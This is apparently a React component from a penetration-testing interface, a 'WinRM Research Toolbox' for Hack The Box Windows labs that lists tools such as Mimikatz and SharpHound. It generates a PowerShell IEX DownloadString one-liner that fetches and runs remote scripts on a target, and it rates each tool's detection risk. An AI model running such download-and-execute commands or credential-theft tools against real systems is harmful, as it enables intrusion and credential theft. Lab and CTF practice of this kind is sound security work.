
import React, { useState } from 'react';
import { PENTEST_TOOLS } from '../constants';
import { PentestTool } from '../types';
// Fixed: Removed non-existent 'Tool' icon import from lucide-react
import { Download, ExternalLink, Shield, Search, Terminal as TerminalIcon, Info } from 'lucide-react';

interface ToolboxProps {
  onInsertCode: (code: string) => void;
}

const Toolbox: React.FC<ToolboxProps> = ({ onInsertCode }) => {
  const [searchTerm, setSearchTerm] = useState('');
  const [categoryFilter, setCategoryFilter] = useState<string>('all');

  const filteredTools = PENTEST_TOOLS.filter(tool => {
    const matchesSearch = tool.name.toLowerCase().includes(searchTerm.toLowerCase()) || 
                         tool.description.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesCategory = categoryFilter === 'all' || tool.category === categoryFilter;
    return matchesSearch && matchesCategory;
  });

  const generateDeploymentCode = (tool: PentestTool) => {
    if (tool.type === 'ps1') {
      return `IEX (New-Object Net.WebClient).DownloadString('${tool.rawUrl}')`;
    }
    return `# Manual download required for EXE: ${tool.rawUrl}`;
  };

  return (
    <div className="flex flex-col h-full gap-6 overflow-hidden">
      <header className="flex flex-col gap-1">
        <h2 className="text-xl font-black text-emerald-400 uppercase tracking-tighter flex items-center gap-2">
          <Shield size={20} /> WinRM Research Toolbox
        </h2>
        <p className="text-xs text-slate-500">Curated industrial-grade tools for HTB Windows environments.</p>
      </header>

      <div className="flex flex-col sm:flex-row gap-4 items-center bg-slate-900/50 p-4 rounded-2xl border border-slate-800">
        <div className="relative flex-1">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={16} />
          <input 
            type="text"
            placeholder="Search tools (e.g., Mimikatz, SharpHound)..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full bg-black border border-slate-800 rounded-xl py-2 pl-10 pr-4 text-xs text-slate-300 focus:border-emerald-500 transition-all outline-none"
          />
        </div>
        <div className="flex gap-2">
          {['all', 'enumeration', 'credentials', 'privesc'].map(cat => (
            <button
              key={cat}
              onClick={() => setCategoryFilter(cat)}
              className={`px-3 py-1.5 rounded-lg text-[10px] font-black uppercase transition-all ${
                categoryFilter === cat ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-500 hover:text-slate-300'
              }`}
            >
              {cat}
            </button>
          ))}
        </div>
      </div>

      <div className="flex-1 overflow-y-auto pr-2 grid grid-cols-1 lg:grid-cols-2 gap-4 pb-10">
        {filteredTools.map(tool => (
          <div key={tool.id} className="bg-slate-900/40 border border-slate-800 rounded-2xl p-5 hover:border-emerald-500/30 transition-all group relative overflow-hidden">
            <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity">
              <Shield size={48} />
            </div>
            
            <div className="flex justify-between items-start mb-3">
              <div>
                <h3 className="text-sm font-black text-slate-100 uppercase tracking-tight">{tool.name}</h3>
                <span className="text-[9px] font-bold text-emerald-500 bg-emerald-500/10 px-2 py-0.5 rounded uppercase mt-1 inline-block">
                  {tool.category}
                </span>
              </div>
              <div className="flex gap-1">
                <a 
                  href={tool.githubUrl} 
                  target="_blank" 
                  rel="noreferrer"
                  className="p-2 bg-slate-800/50 rounded-lg text-slate-500 hover:text-blue-400 transition-colors"
                  title="Source Code"
                >
                  <ExternalLink size={14} />
                </a>
                <button 
                  onClick={() => onInsertCode(generateDeploymentCode(tool))}
                  className="p-2 bg-emerald-600/10 rounded-lg text-emerald-500 hover:bg-emerald-600 hover:text-white transition-all"
                  title="Deploy to WinRM"
                >
                  <TerminalIcon size={14} />
                </button>
              </div>
            </div>

            <p className="text-xs text-slate-500 mb-6 leading-relaxed line-clamp-2">
              {tool.description}
            </p>

            <div className="mt-auto space-y-2">
              <div className="flex items-center gap-2 text-[10px] text-slate-600 font-mono overflow-hidden">
                <Download size={10} />
                <span className="truncate">{tool.rawUrl}</span>
              </div>
              <div className="flex items-center gap-2 text-[9px] font-black uppercase text-slate-700">
                <Info size={10} />
                <span>Detection Risk: {tool.type === 'ps1' ? 'Medium (IEX)' : 'High (Disk)'}</span>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default Toolbox;
